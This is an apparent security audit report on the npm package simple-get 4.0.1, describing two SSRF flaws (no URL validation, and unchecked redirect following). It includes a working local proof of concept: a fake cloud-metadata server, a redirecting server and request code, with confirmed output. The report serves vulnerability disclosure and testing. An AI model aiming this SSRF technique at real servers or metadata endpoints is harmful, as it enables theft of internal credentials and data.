# simple-get — Security Review Findings

**Package:** [simple-get](https://www.npmjs.com/package/simple-get) | **Files reviewed:** 1

## Summary

| ID | Vulnerability Class | Severity | Breachable | Location |
|----|---------------------|----------|------------|----------|
| SG-01 | SSRF — No URL Validation | HIGH | Yes | `simpleGet()`, lines 18-22 |
| SG-02 | SSRF — Open Redirect Chain | HIGH | Yes | `simpleGet()`, lines 50-68 (redirect handler) |

---

## SG-01: SSRF — No URL Validation

- **Vulnerability class:** Server-Side Request Forgery (SSRF)
- **Raw severity:** HIGH
- **Adjusted severity (after reachability):** HIGH
- **Location:** `simpleGet()`, lines 18-22

### Reachability Analysis

Any caller passing a user-controlled URL directly to `simpleGet()` triggers an outbound request with no validation. The library performs no checks on the URL scheme, hostname, or destination IP — internal network addresses, cloud metadata endpoints, and localhost services are all reachable.

### Gate Status

**No gate** — exploitable in default configuration with no additional conditions required.

**Breach:** True

---

## SG-02: SSRF — Open Redirect Chain

- **Vulnerability class:** Server-Side Request Forgery (SSRF) via Redirect Following
- **Raw severity:** HIGH
- **Adjusted severity (after reachability):** HIGH
- **Location:** `simpleGet()`, lines 50-68 (redirect handler)

### Reachability Analysis

The redirect handler follows 3xx responses to an attacker-controlled `Location` header value without re-validating the destination. Even if the initial URL passes an allowlist check, a redirect can land the request on an internal IP or metadata endpoint.

### Gate Status

**No gate** — exploitable in default configuration with no additional conditions required.

**Breach:** True

---

## Clean / Rejected

| Finding | Reason for Rejection |
|---------|---------------------|
| CRLF injection (line 19) | Only exploitable on older Node.js versions that do not sanitize HTTP headers. Modern Node.js rejects CRLF in header values. |
| Prototype pollution via header keys (line 26) | Header keys from HTTP responses do not flow into `Object.prototype`. No exploitable path confirmed. |
| Header value injection (line 26) | Same mitigation as CRLF — modern Node.js HTTP parser rejects malformed headers. |
| Deserialization of untrusted JSON (concat, lines 91-96) | JSON.parse of concatenated response body. No gadget chain or code execution path — produces data, not executable objects. |

---

---

## Reproduction (validated 2026-06-19)

**Lab reference:** `targets/labs/npm-simple-get/`

**Pinned version:** simple-get 4.0.1

### Steps

1. **Install the package:**
   ```bash
   npm install simple-get@4.0.1
   ```

2. **Start two local servers:**
   - **Target server** on port 4444 simulating a cloud metadata endpoint:
     ```javascript
     http.createServer((req, res) => {
       res.end('INTERNAL-METADATA-169.254.169.254: flag=secret-data');
     }).listen(4444);
     ```
   - **Redirector** on port 4445 that sends a 302 to the target:
     ```javascript
     http.createServer((req, res) => {
       res.writeHead(302, { Location: 'http://127.0.0.1:4444/metadata' });
       res.end();
     }).listen(4445);
     ```

3. **Test SG-01 (direct SSRF):**
   ```javascript
   const get = require('simple-get');
   get.concat('http://127.0.0.1:4444/internal-direct', (err, res, data) => {
     console.log(data.toString()); // -> INTERNAL-METADATA-169.254.169.254: flag=secret-data
   });
   ```

4. **Test SG-02 (redirect-based SSRF):**
   ```javascript
   get.concat('http://127.0.0.1:4445/goto', (err, res, data) => {
     console.log(data.toString()); // -> INTERNAL-METADATA (followed redirect to internal IP)
   });
   ```

### Observed output (from `targets/labs/npm-simple-get/results.txt`)

```
simple-get PoC -- version: 4.0.1

=== SG-01: SSRF via direct internal URL ===
  SG-01 RESULT: status=200 body=INTERNAL-METADATA-169.254.169.254: flag=secret-data
  >>> SG-01 CONFIRMED: simple-get reached internal 127.0.0.1 <<<

=== SG-02: SSRF via redirect to internal URL ===
  SG-02 RESULT: status=200 body=INTERNAL-METADATA-169.254.169.254: flag=secret-data
  >>> SG-02 CONFIRMED: redirect followed to internal IP <<<
```

### Verdict

**CONFIRMED.** Both direct SSRF and redirect-based SSRF work. The library performs zero URL validation and follows redirects to internal IPs without re-checking the destination.

---

**Pipeline:** 6 raw findings → 2 confirmed (2 HIGH breachable)
